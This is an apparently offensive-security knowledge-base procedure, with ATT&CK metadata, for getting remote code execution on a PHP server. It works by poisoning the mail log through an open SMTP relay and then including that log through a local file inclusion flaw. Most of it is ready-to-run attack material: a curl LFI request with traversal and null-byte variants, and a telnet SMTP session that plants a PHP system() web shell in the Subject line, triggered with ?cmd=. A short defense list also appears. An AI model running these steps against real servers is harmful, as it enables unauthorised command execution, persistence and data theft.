---
id: a93ec17f-db42-48ff-955d-27b77930e5b7
name: LFI-to-RCE-via-Mail-Log-File-Inclusion
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.614016+00:00'
updated_at: '2023-10-10T20:22:15.211562+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques: []
tags:
  - '[[tags/LFI]]'
  - '[[tags/RCE]]'
  - '[[tags/Log Poisoning]]'
  - '[[tags/PHP Injection]]'
  - '[[tags/Mail Log]]'
commands:
  - '[[commands/curl-lfi-access-mail-log]]'
  - '[[commands/mail-send-test-email]]'
  - '[[commands/telnet-smtp-php-injection]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# LFI-to-RCE-via-Mail-Log-File-Inclusion

## Summary

This procedure exploits a Local File Inclusion (LFI) vulnerability in a PHP application to include the server's mail log file (/var/log/mail), which has been poisoned with PHP code via an open SMTP relay. By injecting malicious PHP code into an email subject or body, the attacker achieves Remote Code Execution (RCE) when the log is included and parsed as PHP.

## Description

In this technique, the target web application has an LFI vulnerability allowing inclusion of arbitrary local files via a parameter like ?page=. The attacker targets the mail log because many Linux systems log email headers and bodies to /var/log/mail when using Postfix or similar MTAs. An open SMTP server (often port 25) allows unauthenticated email sending. The attacker sends an email with PHP code (e.g., <?php system($_GET['cmd']); ?>) in the subject or body, poisoning the log. Then, triggering the LFI to include /var/log/mail executes the PHP code. This is effective on misconfigured web servers running as a user with write access to logs or in default setups. Prerequisites include discovering the LFI and confirming an open SMTP relay. Success grants command execution on the server, enabling further post-exploitation like reverse shells or data exfiltration.

## Requirements

1. Valid LFI vulnerability in the target PHP application (e.g., unsanitized file inclusion parameter).
2. Open SMTP relay on the target (port 25 accessible, no authentication required).
3. Knowledge of the mail log path (/var/log/mail or similar; confirm via reconnaissance).
4. Network access to the web app and SMTP port.
5. Tools like curl for LFI testing and telnet/mail for injection.

## Defense

- Sanitize and validate all file inclusion parameters to prevent LFI (use whitelists, avoid realpath resolution bypasses).
- Disable or secure SMTP relays with authentication (use smtpd_relay_restrictions in Postfix).
- Run web servers with minimal privileges and isolate log files (e.g., no PHP execution in log directories).
- Monitor logs for anomalous PHP code injections and web access patterns (e.g., repeated /var/log/mail inclusions).
- Implement WAF rules to block LFI payloads and PHP tags in email content.

## Objectives

1. Poison the mail log with executable PHP code via SMTP.
2. Trigger LFI to include and execute the poisoned log file.
3. Achieve RCE to run arbitrary commands on the target server.
4. Establish persistence or exfiltrate data post-execution.

## Instructions

### Step 1: Test LFI Access to Mail Log

**Context**: Verify the LFI vulnerability by attempting to include the mail log file. This step confirms the path and that the log is parsable, setting up for code injection. Use a tool like curl to send the request and observe if log content (e.g., email headers) is reflected in the response.

**Command** ([[commands/curl-lfi-access-mail-log]]):
```bash
curl "http://$_TARGET_HOST/index.php?page=/var/log/mail"
```

> This command sends an HTTP GET request to the vulnerable endpoint with the LFI payload. Replace $_TARGET_HOST with the target's IP or domain. The response should display contents of /var/log/mail if successful, such as recent email logs. If no output or errors, try path traversal like ../../../../var/log/mail or null byte %00 termination for PHP < 5.3.

### Step 2: Send Test Email to Confirm Log Writing

**Context**: Send a benign test email via the SMTP relay to ensure emails are logged to /var/log/mail. This verifies the logging mechanism before injecting malicious code. Check the LFI response after sending to see if the test email appears in the included log.

**Command** ([[commands/mail-send-test-email]]):
```bash
mail -s "Test Subject" $_RECIPIENT_EMAIL < /dev/null
```

> Execute this from a machine with mailutils installed (or use telnet alternative). $_RECIPIENT_EMAIL is a local user like root@$_TARGET_HOST. After sending, re-run Step 1's LFI command; expected output includes the test subject in the log dump, confirming logging path.

### Step 3: Inject PHP Code via SMTP Using Telnet

**Context**: Connect to the SMTP server and craft an email with PHP code in the subject line to poison the log. The PHP webshell (e.g., system($_GET['cmd'])) will execute when the log is included via LFI. This is interactive; capture the session for repeatability.

**Code** ([[codes/telnet-smtp-session-for-php-injection]]):

> Use this code to simulate the full SMTP interaction. It connects via telnet, authenticates the session, and injects the PHP payload. After execution, trigger LFI again to run the code, e.g., append ?cmd=whoami to the URL.

**Command** ([[commands/telnet-smtp-php-injection]]):
```bash
telnet $_TARGET_HOST 25
HELO $_ATTACKER_HOST
MAIL FROM: <attacker@example.com>
RCPT TO: <root@$_TARGET_HOST>
DATA
Subject: <?php system($_GET["cmd"]); ?>
.
QUIT
```

> This is an interactive telnet session. Replace $_TARGET_HOST with the target's IP, $_ATTACKER_HOST with your domain/IP. The PHP code in the Subject poisons the log. Post-injection, access the LFI URL with ?cmd=id to test RCE; success shows command output embedded in the page.
